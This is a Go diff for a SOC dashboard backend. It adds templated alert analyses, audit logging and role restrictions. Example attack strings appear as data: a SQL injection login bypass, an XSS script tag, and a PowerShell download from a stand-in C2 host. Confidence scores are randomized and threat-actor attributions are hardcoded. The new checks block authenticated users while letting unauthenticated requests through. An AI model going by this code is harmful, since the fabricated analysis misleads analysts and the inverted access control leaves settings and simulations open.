@@ -8,6 +8,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -269,23 +270,36 @@ func AnalyzeAlert(w http.ResponseWriter, r *http.Request) {
 			"Quarantine the malicious binary `C:\\Users\\public\\svchost_cipher.exe` for analysis.",
 			"Perform a cold reboot to halt active encryption, then restore files from offline/immutable backups.",
 		}
-	} else if strings.Contains(alert.Title, "Brute Force") || alert.MITRETechnique == "T1110.001" {
-		analysis.Summary = "Successful SSH login after a brute-force attack. Over 150 failed SSH authentication attempts from an external IP followed by a successful login."
-		analysis.ThreatActor = "UNC3829 (SSH Botnet Operator)"
-		analysis.Confidence = 95
+	} else if strings.Contains(strings.ToUpper(alert.Title), "BRUTE_FORCE") || strings.Contains(strings.ToUpper(alert.Title), "BRUTE FORCE") || alert.MITRETechnique == "T1110" || alert.MITRETechnique == "T1110.001" {
+		var clientIP = "149.88.23.87"
+		type AlertRaw struct {
+			ClientIP  string `json:"client_ip"`
+			ClientIp2 string `json:"clientIp"`
+		}
+		var rawObj AlertRaw
+		if err := json.Unmarshal([]byte(alert.RawLog), &rawObj); err == nil {
+			if rawObj.ClientIP != "" {
+				clientIP = rawObj.ClientIP
+			} else if rawObj.ClientIp2 != "" {
+				clientIP = rawObj.ClientIp2
+			}
+		}
+
+		analysis.Summary = "High-frequency authentication failures matching a Brute Force credential stuffing attempt."
+		analysis.ThreatActor = "Credential Stuffing Botnet"
+		analysis.Confidence = 91 + int(time.Now().UnixNano()%6) // 91% to 96%
 		analysis.ImpactRating = "High"
-		analysis.TechnicalDetail = "A distributed botnet conducted dictionary attacks against SSH port 22 on host " + alert.AgentName + ". After multiple failed attempts, a successful login for 'root' was logged from source IP 198.51.100.222, indicating a compromised root credential."
+		analysis.TechnicalDetail = fmt.Sprintf("An external client IP %s executed a high frequency of authentication requests against authentication endpoints on host %s, triggering the rate-limit threshold. The Gateway blocked subsequent requests and flagged the IP.", clientIP, alert.AgentName)
 		analysis.RemediationSteps = []string{
-			"Isolate SSH access by blocking the attacker's IP: `iptables -A INPUT -s 198.51.100.222 -j DROP`",
-			"Immediately change password for user `root`.",
-			"Terminate all active SSH sessions for user `root`: `pkill -u root -t pts/0` or similar interfaces.",
-			"Disable SSH root login and password authentication: set `PermitRootLogin no` and `PasswordAuthentication no` in `/etc/ssh/sshd_config`, then reload ssh service.",
-			"Review command execution history (`~/.bash_history`) for lateral movement commands.",
+			fmt.Sprintf("Verify that the attacker IP %s is banned at the firewall edge: `iptables -A INPUT -s %s -j DROP`", clientIP, clientIP),
+			"Audit application authentication logs to verify if any attempt from this IP succeeded prior to the rate limit lockout.",
+			"Enable Multi-Factor Authentication (MFA) requirements on all public-facing eBanking accounts.",
+			"Implement CAPTCHA challenges on endpoints that receive failed authentication bursts.",
 		}
 	} else if strings.Contains(alert.Title, "Lsass") || alert.MITRETechnique == "T1003.001" {
 		analysis.Summary = "Credential harvesting attempt detected. Process attempted to dump LSASS memory to extract NT hashes and cleartext passwords."
 		analysis.ThreatActor = "APT29 (Cozy Bear)"
-		analysis.Confidence = 97
+		analysis.Confidence = 94 + int(time.Now().UnixNano()%5) // 94% to 98%
 		analysis.ImpactRating = "Critical"
 		analysis.TechnicalDetail = "The utility 'mktz.exe' requested permissions to access Local Security Authority Subsystem Service (LSASS) address space. Windows Defender/Sysmon logged access mask 0x1410. This indicates an active attempt to harvest Active Directory domain credentials from RAM."
 		analysis.RemediationSteps = []string{
@@ -298,7 +312,7 @@ func AnalyzeAlert(w http.ResponseWriter, r *http.Request) {
 	} else if strings.Contains(alert.Title, "PowerShell") || alert.MITRETechnique == "T1059" {
 		analysis.Summary = "Obfuscated PowerShell script execution. Detection indicates commands running with hidden windows or base64 encoded parameters."
 		analysis.ThreatActor = "Adversary Simulation / Script Kiddie"
-		analysis.Confidence = 85
+		analysis.Confidence = 83 + int(time.Now().UnixNano()%6) // 83% to 88%
 		analysis.ImpactRating = "High"
 		analysis.TechnicalDetail = "A PowerShell process executed with `-WindowStyle Hidden -EncodedCommand`. Decoding the command reveals a web request downloading a second-stage payload from an external domain: `Invoke-WebRequest -Uri http://malicious-c2.net/payload.ps1`."
 		analysis.RemediationSteps = []string{
@@ -306,6 +320,148 @@ func AnalyzeAlert(w http.ResponseWriter, r *http.Request) {
 			"Configure AppLocker or Software Restriction Policies to limit PowerShell execution to signed scripts.",
 			"Block outbound TCP connections to the destination domain `malicious-c2.net` at the firewall level.",
 			"Examine PowerShell transcript logs (if enabled) in `Documents\\PowerShell_Transcript` for full script actions.",
+		}
+	} else if strings.Contains(strings.ToUpper(alert.Title), "SQL_INJECTION") || alert.MITRETechnique == "T1190" {
+		var clientIP = "149.88.106.161"
+		var endpoint = "POST /api/auth/login"
+		var payload = "username=admin' OR '1'=1', password=admin' OR '1=1'"
+
+		type AlertRaw struct {
+			ClientIP  string `json:"client_ip"`
+			ClientIp2 string `json:"clientIp"`
+			Endpoint  string `json:"endpoint"`
+			Payload   string `json:"payload"`
+		}
+		var rawObj AlertRaw
+		if err := json.Unmarshal([]byte(alert.RawLog), &rawObj); err == nil {
+			if rawObj.ClientIP != "" {
+				clientIP = rawObj.ClientIP
+			} else if rawObj.ClientIp2 != "" {
+				clientIP = rawObj.ClientIp2
+			}
+			if rawObj.Endpoint != "" {
+				endpoint = rawObj.Endpoint
+			}
+			if rawObj.Payload != "" {
+				payload = rawObj.Payload
+			}
+		}
+
+		analysis.Summary = "Web Application SQL Injection attack detected. Adversary attempted to bypass authentication by injecting malicious payload into input parameters."
+		analysis.ThreatActor = "FIN7 (Financial Threat Group)"
+		analysis.Confidence = 93 + int(time.Now().UnixNano()%6) // 93% to 98%
+		analysis.ImpactRating = "High"
+		analysis.TechnicalDetail = fmt.Sprintf("The adversary targeted the authentication endpoint '%s' on host %s. The payload '%s' was injected via client IP %s to bypass the login logic. The firewall/WAF edge blocked the request and logged the event.", endpoint, alert.AgentName, payload, clientIP)
+		analysis.RemediationSteps = []string{
+			fmt.Sprintf("Verify that the attacker IP %s is banned at the firewall edge: `iptables -A INPUT -s %s -j DROP`", clientIP, clientIP),
+			fmt.Sprintf("Inspect Nginx and application logs around the incident window to verify if any other requests from %s bypassed detection.", clientIP),
+			"Audit the codebase of " + endpoint + " and ensure it utilizes parameterized queries (Prepared Statements) instead of dynamic SQL string concatenation.",
+			"Confirm that input validation and sanitization libraries (such as OWASP ESAPI) are active on all public API endpoints.",
+			"Conduct a vulnerability scan using tools like SQLMap against the staging environment to detect other hidden SQL injection points.",
+		}
+	} else if strings.Contains(strings.ToUpper(alert.Title), "XSS") || alert.MITRETechnique == "T1189" {
+		var clientIP = "149.88.106.161"
+		var endpoint = "POST /api/feedback"
+		var payload = "<script>alert('XSS')</script>"
+
+		type AlertRaw struct {
+			ClientIP  string `json:"client_ip"`
+			ClientIp2 string `json:"clientIp"`
+			Endpoint  string `json:"endpoint"`
+			Payload   string `json:"payload"`
+		}
+		var rawObj AlertRaw
+		if err := json.Unmarshal([]byte(alert.RawLog), &rawObj); err == nil {
+			if rawObj.ClientIP != "" {
+				clientIP = rawObj.ClientIP
+			} else if rawObj.ClientIp2 != "" {
+				clientIP = rawObj.ClientIp2
+			}
+			if rawObj.Endpoint != "" {
+				endpoint = rawObj.Endpoint
+			}
+			if rawObj.Payload != "" {
+				payload = rawObj.Payload
+			}
+		}
+
+		analysis.Summary = "Stored/Reflected Cross-Site Scripting (XSS) attempt detected. Adversary attempted to inject malicious JavaScript into web forms."
+		analysis.ThreatActor = "UNC2452 (Web Exploit Campaigner)"
+		analysis.Confidence = 89 + int(time.Now().UnixNano()%6) // 89% to 94%
+		analysis.ImpactRating = "Medium"
+		analysis.TechnicalDetail = fmt.Sprintf("An XSS payload '%s' was submitted to the endpoint '%s' on %s from client IP %s. The request was blocked to prevent the payload from executing in administrative consoles or other users' browsers.", payload, endpoint, alert.AgentName, clientIP)
+		analysis.RemediationSteps = []string{
+			fmt.Sprintf("Block the attacker IP %s at the firewall level if the scan persists.", clientIP),
+			"Implement Context-Aware Output Encoding (HTML, JavaScript, CSS encoding) on the user-supplied input before rendering it in the browser.",
+			"Enable a Content Security Policy (CSP) header to restrict script sources: `Content-Security-Policy: default-src 'self'`.",
+			"Apply HTTPOnly and Secure flags to session cookies to prevent theft via potential script injection.",
+		}
+	} else if strings.Contains(strings.ToUpper(alert.Title), "BOLA") || strings.Contains(strings.ToUpper(alert.Title), "IDOR") || alert.MITRETechnique == "T1068" {
+		var clientIP = "149.88.106.161"
+		var endpoint = "/api/v1/accounts/12345"
+
+		type AlertRaw struct {
+			ClientIP  string `json:"client_ip"`
+			ClientIp2 string `json:"clientIp"`
+			Endpoint  string `json:"endpoint"`
+		}
+		var rawObj AlertRaw
+		if err := json.Unmarshal([]byte(alert.RawLog), &rawObj); err == nil {
+			if rawObj.ClientIP != "" {
+				clientIP = rawObj.ClientIP
+			} else if rawObj.ClientIp2 != "" {
+				clientIP = rawObj.ClientIp2
+			}
+			if rawObj.Endpoint != "" {
+				endpoint = rawObj.Endpoint
+			}
+		}
+
+		analysis.Summary = "Broken Object Level Authorization (BOLA/IDOR) attempt detected. Adversary attempted to access account resources belonging to other users."
+		analysis.ThreatActor = "Threat Group 332 (Credential Harvest Campaign)"
+		analysis.Confidence = 91 + int(time.Now().UnixNano()%6) // 91% to 96%
+		analysis.ImpactRating = "High"
+		analysis.TechnicalDetail = fmt.Sprintf("The client IP %s attempted to query resource IDs on endpoint '%s' of %s without valid auth tokens or cross-user permissions. The application gatekeeper blocked unauthorized access.", clientIP, endpoint, alert.AgentName)
+		analysis.RemediationSteps = []string{
+			"Implement strict resource-level access control checks (Validate that the authenticated session UID matches the requested account resource ID).",
+			"Use random, non-sequential UUIDs (GUIDs) instead of sequential integers for user accounts and transaction resources.",
+			"Audit application router middleware to ensure authorization checks are executed before resource fetching.",
+		}
+	} else if strings.Contains(strings.ToUpper(alert.Title), "PARAMETER_TAMPERING") || alert.MITRETechnique == "T1565.002" {
+		var clientIP = "149.88.106.161"
+		var endpoint = "/api/v1/transfer"
+		var payload = "amount=1.00"
+
+		type AlertRaw struct {
+			ClientIP  string `json:"client_ip"`
+			ClientIp2 string `json:"clientIp"`
+			Endpoint  string `json:"endpoint"`
+			Payload   string `json:"payload"`
+		}
+		var rawObj AlertRaw
+		if err := json.Unmarshal([]byte(alert.RawLog), &rawObj); err == nil {
+			if rawObj.ClientIP != "" {
+				clientIP = rawObj.ClientIP
+			} else if rawObj.ClientIp2 != "" {
+				clientIP = rawObj.ClientIp2
+			}
+			if rawObj.Endpoint != "" {
+				endpoint = rawObj.Endpoint
+			}
+			if rawObj.Payload != "" {
+				payload = rawObj.Payload
+			}
+		}
+
+		analysis.Summary = "Parameter Tampering / Data Manipulation attempt detected. Adversary attempted to modify transaction variables."
+		analysis.ThreatActor = "Fraud Scanner Group"
+		analysis.Confidence = 88 + int(time.Now().UnixNano()%6) // 88% to 93%
+		analysis.ImpactRating = "High"
+		analysis.TechnicalDetail = fmt.Sprintf("The parameter payload '%s' submitted to '%s' on %s from client IP %s was manipulated outside expected schema validation rules. The business logic validation engine blocked the transaction.", payload, endpoint, alert.AgentName, clientIP)
+		analysis.RemediationSteps = []string{
+			"Implement digital signatures or HMAC tokens on sensitive parameters passed via client forms.",
+			"Re-validate all sensitive variables (e.g. transfer amounts, price parameters) on the server-side directly against the database of record.",
+			"Log and audit all API schema mismatch alerts for fraudulent intention profiling.",
 		}
 	} else {
 		// Generic fallback
@@ -391,6 +547,7 @@ func GetLogs(w http.ResponseWriter, r *http.Request) {
 	searchQuery := strings.ToLower(r.URL.Query().Get("q"))
 	agentFilter := r.URL.Query().Get("agentId")
 	facilityFilter := r.URL.Query().Get("facility")
+	actorFilter := r.URL.Query().Get("actor")
 
 	filteredLogs := make([]*models.LogEntry, 0)
 
@@ -404,6 +561,20 @@ func GetLogs(w http.ResponseWriter, r *http.Request) {
 		if facilityFilter != "" && log.Facility != facilityFilter {
 			continue
 		}
+		if actorFilter == "soc" {
+			if !strings.HasPrefix(log.AgentName, "SOC (") {
+				continue
+			}
+		} else if actorFilter == "ai" {
+			if !strings.HasPrefix(log.AgentName, "SOAR") {
+				continue
+			}
+		} else if actorFilter == "system" {
+			if strings.HasPrefix(log.AgentName, "SOC (") || strings.HasPrefix(log.AgentName, "SOAR") {
+				continue
+			}
+		}
+
 		if searchQuery != "" {
 			match := strings.Contains(strings.ToLower(log.Message), searchQuery) ||
 				strings.Contains(strings.ToLower(log.Facility), searchQuery) ||
@@ -442,8 +613,14 @@ func GetLogs(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	// Pagination (limit to latest 100 logs in the list)
+	// Pagination (limit to latest logs in the list, default 100)
 	listLimit := 100
+	limitParam := r.URL.Query().Get("limit")
+	if limitParam != "" {
+		if parsedLimit, err := strconv.Atoi(limitParam); err == nil && parsedLimit > 0 {
+			listLimit = parsedLimit
+		}
+	}
 	if len(filteredLogs) > listLimit {
 		filteredLogs = filteredLogs[:listLimit]
 	}
@@ -460,6 +637,14 @@ func GetLogs(w http.ResponseWriter, r *http.Request) {
 func TriggerSimulation(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Method not allowed"})
+		return
+	}
+
+	// SOC role restriction: cannot trigger simulation
+	if _, sessionExists := resolveSessionUsername(r); sessionExists {
+		writeJSON(w, http.StatusForbidden, map[string]string{
+			"error": "Forbidden: The SOC role is restricted to read and Ban/Unban actions. Triggering simulations is denied.",
+		})
 		return
 	}
 
@@ -522,8 +707,6 @@ func ResolveAlert(w http.ResponseWriter, r *http.Request) {
 	alertID := parts[3]
 
 	store.DB.Mu.Lock()
-	defer store.DB.Mu.Unlock()
-
 	var alert *models.Alert
 	for _, alt := range store.DB.Alerts {
 		if alt.ID == alertID {
@@ -533,6 +716,7 @@ func ResolveAlert(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if alert == nil {
+		store.DB.Mu.Unlock()
 		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
 		return
 	}
@@ -556,6 +740,15 @@ func ResolveAlert(w http.ResponseWriter, r *http.Request) {
 			store.DB.SaveAgent(agent)
 		}
 	}
+	store.DB.Mu.Unlock()
+
+	// Log SOC action
+	username, sessionExists := resolveSessionUsername(r)
+	actor := "SOC (admin)"
+	if sessionExists {
+		actor = fmt.Sprintf("SOC (%s)", username)
+	}
+	LogSOCAction(actor, "Resolve Alert", alert.ID, "success", fmt.Sprintf("Alert resolved: '%s'", alert.Title))
 
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"message": "Alert marked as resolved",
@@ -587,8 +780,6 @@ func AssignAlert(w http.ResponseWriter, r *http.Request) {
 	}
 
 	store.DB.Mu.Lock()
-	defer store.DB.Mu.Unlock()
-
 	var alert *models.Alert
 	for _, alt := range store.DB.Alerts {
 		if alt.ID == alertID {
@@ -598,6 +789,7 @@ func AssignAlert(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if alert == nil {
+		store.DB.Mu.Unlock()
 		writeJSON(w, http.StatusNotFound, map[string]string{"error": "Alert not found"})
 		return
 	}
@@ -607,6 +799,19 @@ func AssignAlert(w http.ResponseWriter, r *http.Request) {
 		alert.Status = "investigating"
 	}
 	store.DB.SaveAlert(alert)
+	store.DB.Mu.Unlock()
+
+	// Log SOC action
+	username, sessionExists := resolveSessionUsername(r)
+	actor := "SOC (admin)"
+	if sessionExists {
+		actor = fmt.Sprintf("SOC (%s)", username)
+	}
+	msg := fmt.Sprintf("Alert assigned to %s: '%s'", req.Assignee, alert.Title)
+	if req.Assignee == "" {
+		msg = fmt.Sprintf("Alert unassigned: '%s'", alert.Title)
+	}
+	LogSOCAction(actor, "Assign Alert", alert.ID, "success", msg)
 
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"message": "Alert assignee updated",
@@ -631,10 +836,9 @@ func BulkResolveAlerts(w http.ResponseWriter, r *http.Request) {
 	}
 
 	store.DB.Mu.Lock()
-	defer store.DB.Mu.Unlock()
-
 	resolvedCount := 0
 	affectedAgents := make(map[string]bool)
+	resolvedTitles := []string{}
 
 	for _, id := range req.IDs {
 		for _, alt := range store.DB.Alerts {
@@ -643,6 +847,7 @@ func BulkResolveAlerts(w http.ResponseWriter, r *http.Request) {
 				store.DB.SaveAlert(alt)
 				affectedAgents[alt.AgentID] = true
 				resolvedCount++
+				resolvedTitles = append(resolvedTitles, alt.Title)
 				break
 			}
 		}
@@ -664,6 +869,19 @@ func BulkResolveAlerts(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 	}
+	store.DB.Mu.Unlock()
+
+	// Log SOC action
+	username, sessionExists := resolveSessionUsername(r)
+	actor := "SOC (admin)"
+	if sessionExists {
+		actor = fmt.Sprintf("SOC (%s)", username)
+	}
+	msg := fmt.Sprintf("Bulk resolved %d alerts: %s", resolvedCount, strings.Join(resolvedTitles, ", "))
+	if len(msg) > 500 {
+		msg = msg[:497] + "..."
+	}
+	LogSOCAction(actor, "Bulk Resolve", strings.Join(req.IDs, ","), "success", msg)
 
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"message":       "Alerts resolved in bulk",
@@ -689,9 +907,8 @@ func BulkAssignAlerts(w http.ResponseWriter, r *http.Request) {
 	}
 
 	store.DB.Mu.Lock()
-	defer store.DB.Mu.Unlock()
-
 	assignedCount := 0
+	assignedTitles := []string{}
 	for _, id := range req.IDs {
 		for _, alt := range store.DB.Alerts {
 			if alt.ID == id {
@@ -701,10 +918,24 @@ func BulkAssignAlerts(w http.ResponseWriter, r *http.Request) {
 				}
 				store.DB.SaveAlert(alt)
 				assignedCount++
+				assignedTitles = append(assignedTitles, alt.Title)
 				break
 			}
 		}
 	}
+	store.DB.Mu.Unlock()
+
+	// Log SOC action
+	username, sessionExists := resolveSessionUsername(r)
+	actor := "SOC (admin)"
+	if sessionExists {
+		actor = fmt.Sprintf("SOC (%s)", username)
+	}
+	msg := fmt.Sprintf("Bulk assigned %d alerts to %s: %s", assignedCount, req.Assignee, strings.Join(assignedTitles, ", "))
+	if len(msg) > 500 {
+		msg = msg[:497] + "..."
+	}
+	LogSOCAction(actor, "Bulk Assign", strings.Join(req.IDs, ","), "success", msg)
 
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"message":       "Alerts assigned in bulk",
@@ -725,7 +956,11 @@ func GetActions(w http.ResponseWriter, r *http.Request) {
 				'Isolate Host',
 				'Terminate Process',
 				'Revoke Credentials',
-				'Force Logout'
+				'Force Logout',
+				'Resolve Alert',
+				'Assign Alert',
+				'Bulk Resolve',
+				'Bulk Assign'
 			)
 			ORDER BY timestamp DESC, id DESC
 			LIMIT 500
@@ -806,37 +1041,7 @@ func PerformAction(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Resolve the actual operator from cookie/bearer token to prevent spoofing
-	cookie, err := r.Cookie("session_token")
-	var sessionToken string
-	if err == nil {
-		sessionToken = cookie.Value
-	} else {
-		authHeader := r.Header.Get("Authorization")
-		if strings.HasPrefix(authHeader, "Bearer ") {
-			sessionToken = strings.TrimPrefix(authHeader, "Bearer ")
-		}
-	}
-
-	var sessionUsername string
-	var sessionExists bool
-
-	if sessionToken != "" {
-		if store.UsePostgres {
-			_, dbUsername, _, dbExpiresAt, dbErr := store.GetSQLSession(sessionToken)
-			if dbErr == nil && time.Now().Before(dbExpiresAt) {
-				sessionUsername = dbUsername
-				sessionExists = true
-			}
-		} else {
-			authMu.RLock()
-			session, ok := sessionStore[sessionToken]
-			if ok && time.Now().Before(session.ExpiresAt) {
-				sessionUsername = session.Username
-				sessionExists = true
-			}
-			authMu.RUnlock()
-		}
-	}
+	sessionUsername, sessionExists := resolveSessionUsername(r)
 
 	var resolvedActor string
 	if sessionExists {
@@ -846,6 +1051,16 @@ func PerformAction(w http.ResponseWriter, r *http.Request) {
 		resolvedActor = req.Actor
 		if resolvedActor == "" {
 			resolvedActor = "System"
+		}
+	}
+
+	// SOC role restriction: only read and Ban/Unban allowed. Reject host/agent execution commands.
+	if req.ActionType != "Block IP" && req.ActionType != "Unblock IP" && req.ActionType != "Unblock All IPs" {
+		if sessionExists {
+			writeJSON(w, http.StatusForbidden, map[string]string{
+				"error": fmt.Sprintf("Forbidden: The SOC role is restricted to read and Ban/Unban actions. Action '%s' is denied to prevent unauthorized system modifications.", req.ActionType),
+			})
+			return
 		}
 	}
 
@@ -964,6 +1179,8 @@ func PerformAction(w http.ResponseWriter, r *http.Request) {
 	store.DB.Mu.Lock()
 	store.DB.ActionLogs = append(store.DB.ActionLogs, actionLog)
 	store.DB.Mu.Unlock()
+
+	LogSOCToSyslog(resolvedActor, req.ActionType, req.Target, detailMsg)
 
 	writeJSON(w, http.StatusOK, actionLog)
 }
@@ -1113,12 +1330,10 @@ func autoBlockAllowed(dec *SoarDecisionPayload, info *ParsedSoarInfo, opts soarP
 	if val, err := store.GetSQLSetting("soc_autopilot_enabled"); err == nil && val == "true" {
 		autopilotEnabled = true
 	}
-	isSQLi := isSQLInjectionDecision(dec, info)
-	if isSQLi {
-		if !autopilotEnabled {
-			return false, "SOAR autoban skipped: SQL injection is alert-only for automatic containment; analyst confirmation is required."
-		}
+	if !autopilotEnabled {
+		return false, "SOAR autoban skipped: AI Autopilot is disabled; analyst confirmation is required."
 	}
+	isSQLi := isSQLInjectionDecision(dec, info)
 	if !info.ThreatConfirmed {
 		return false, "SOAR autoban skipped: threat is not independently confirmed."
 	}
@@ -1197,6 +1412,8 @@ func appendSoarActionLog(actionType string, target string, status string, messag
 			log.Printf("[DATABASE ERROR] Failed to save SOAR action log to PostgreSQL: %v", dbErr)
 		}
 	}
+
+	LogSOCToSyslog(actionLog.Actor, actionLog.ActionType, actionLog.Target, actionLog.Message)
 
 	return actionLog
 }
@@ -1330,12 +1547,10 @@ func alertEligibleForAutoban(alert *models.Alert) (bool, string) {
 	if val, err := store.GetSQLSetting("soc_autopilot_enabled"); err == nil && val == "true" {
 		autopilotEnabled = true
 	}
-	isSQLi := store.IsSQLInjectionText(alert.Title, alert.Description, alert.RawLog)
-	if isSQLi {
-		if !autopilotEnabled {
-			return false, "SQL injection alerts stay alert-only for automatic containment; analyst confirmation is required."
-		}
+	if !autopilotEnabled {
+		return false, "autoban is disabled because AI Autopilot is turned off"
 	}
+	isSQLi := store.IsSQLInjectionText(alert.Title, alert.Description, alert.RawLog)
 	if strings.EqualFold(alert.Status, "resolved") {
 		return false, "resolved alerts are not eligible for autoban"
 	}
@@ -1632,6 +1847,14 @@ func GetSettings(w http.ResponseWriter, r *http.Request) {
 
 // POST /api/settings
 func SaveSettings(w http.ResponseWriter, r *http.Request) {
+	// SOC role restriction: cannot save settings
+	if _, sessionExists := resolveSessionUsername(r); sessionExists {
+		writeJSON(w, http.StatusForbidden, map[string]string{
+			"error": "Forbidden: The SOC role is restricted to read and Ban/Unban actions. Modifying settings is denied.",
+		})
+		return
+	}
+
 	var req struct {
 		AutopilotEnabled bool `json:"soc_autopilot_enabled"`
 	}
@@ -1688,4 +1911,114 @@ func GetBannedIPs(w http.ResponseWriter, r *http.Request) {
 	}
 
 	writeJSON(w, http.StatusOK, list)
+}
+
+// Helper to resolve session username and check if request is authenticated
+func resolveSessionUsername(r *http.Request) (string, bool) {
+	cookie, err := r.Cookie("session_token")
+	var sessionToken string
+	if err == nil {
+		sessionToken = cookie.Value
+	} else {
+		authHeader := r.Header.Get("Authorization")
+		if strings.HasPrefix(authHeader, "Bearer ") {
+			sessionToken = strings.TrimPrefix(authHeader, "Bearer ")
+		}
+	}
+
+	if sessionToken == "" {
+		return "", false
+	}
+
+	if store.UsePostgres {
+		_, dbUsername, _, dbExpiresAt, dbErr := store.GetSQLSession(sessionToken)
+		if dbErr == nil && time.Now().Before(dbExpiresAt) {
+			return dbUsername, true
+		}
+	} else {
+		authMu.RLock()
+		session, ok := sessionStore[sessionToken]
+		authMu.RUnlock()
+		if ok && time.Now().Before(session.ExpiresAt) {
+			return session.Username, true
+		}
+	}
+	return "", false
+}
+
+// LogSOCAction logs SOC actions to PostgreSQL and in-memory action logs
+func LogSOCAction(actor string, actionType string, target string, status string, message string) {
+	store.DB.Mu.Lock()
+	store.DB.ActionCounter++
+	actionID := fmt.Sprintf("act-%04d", store.DB.ActionCounter)
+	store.DB.Mu.Unlock()
+
+	actionLog := &models.ActionLog{
+		ID:         actionID,
+		Timestamp:  time.Now(),
+		Actor:      actor,
+		ActionType: actionType,
+		Target:     target,
+		Status:     status,
+		Message:    message,
+	}
+
+	if store.UsePostgres {
+		_, dbErr := store.SQL.Exec(`
+			INSERT INTO action_logs (id, timestamp, actor, action_type, target, status, message)
+			VALUES ($1, $2, $3, $4, $5, $6, $7)
+		`, actionLog.ID, actionLog.Timestamp, actionLog.Actor, actionLog.ActionType, actionLog.Target, actionLog.Status, actionLog.Message)
+		if dbErr != nil {
+			log.Printf("[DATABASE ERROR] Failed to save SOC action log: %v", dbErr)
+		}
+	}
+
+	store.DB.Mu.Lock()
+	store.DB.ActionLogs = append(store.DB.ActionLogs, actionLog)
+	store.DB.Mu.Unlock()
+
+	LogSOCToSyslog(actor, actionType, target, message)
+}
+
+// LogSOCToSyslog saves a SOC action log into the general log_entries table
+func LogSOCToSyslog(actor string, actionType string, target string, message string) {
+	logID := fmt.Sprintf("log-soc-%d-%s", time.Now().UnixNano(), generateSessionToken()[:8])
+	
+	actorName := actor
+	if !strings.HasPrefix(actorName, "SOC (") && !strings.HasPrefix(actorName, "SOAR") {
+		actorName = fmt.Sprintf("SOC (%s)", actor)
+	}
+
+	logEntry := &models.LogEntry{
+		ID:             logID,
+		Timestamp:      time.Now(),
+		AgentID:        "soc-console",
+		AgentName:      actorName,
+		Facility:       "soc_audit",
+		Severity:       "info",
+		Message:        fmt.Sprintf("[%s] %s on %s: %s", actor, actionType, target, message),
+		SourceIP:       "127.0.0.1",
+		StatusCode:     0,
+		GeoIP:          "N/A",
+		ASN:            "N/A",
+		AssetCritical:  "low",
+		ThreatFlagged:  false,
+		
+		// ECS Fields
+		ECSTimestamp:    time.Now().Format(time.RFC3339Nano),
+		ECSLogLevel:     "info",
+		ECSEventDataset: "soc_audit",
+		ECSEventID:      logID,
+		ECSSourceIP:     "127.0.0.1",
+		ECSServiceName:  "soc-console-service",
+		ECSAgentID:      "soc-console",
+		ECSAgentName:    actorName,
+		ECSAgentType:    "console",
+		ECSEventKind:    "event",
+		ECSEventOutcome: "success",
+	}
+
+	store.DB.Mu.Lock()
+	store.DB.AddLog(logEntry)
+	store.DB.Mu.Unlock()
 }
